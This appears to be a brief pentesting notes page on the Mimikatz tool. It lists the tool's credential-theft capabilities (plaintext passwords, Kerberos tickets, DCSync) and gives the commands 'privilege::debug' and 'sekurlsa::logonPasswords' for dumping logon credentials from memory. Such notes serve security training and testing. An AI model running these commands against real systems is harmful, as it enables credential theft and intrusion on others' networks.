# 😿 Mimikatz

It is designed to extract and manipulate sensitive information, such as passwords, security tokens, and Kerberos tickets, from memory.

Mimikatz can be used to perform a variety of tasks, including:

* Extracting plaintext passwords from memory
* Extracting Kerberos tickets and TGTs from memory
* Extracting security tokens and session keys from memory
* Performing pass- and manipulating Kerberos tickets
* Performing DCSync attacks to synchronize the password of a user account

<figure><img src="../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p></figcaption></figure>

start using mimikatz with this command:

```
mimikatz.exe
```

<figure><img src="../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
privilege::debug
sekurlsa::logonPasswords
```

<figure><img src="../../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz" %}
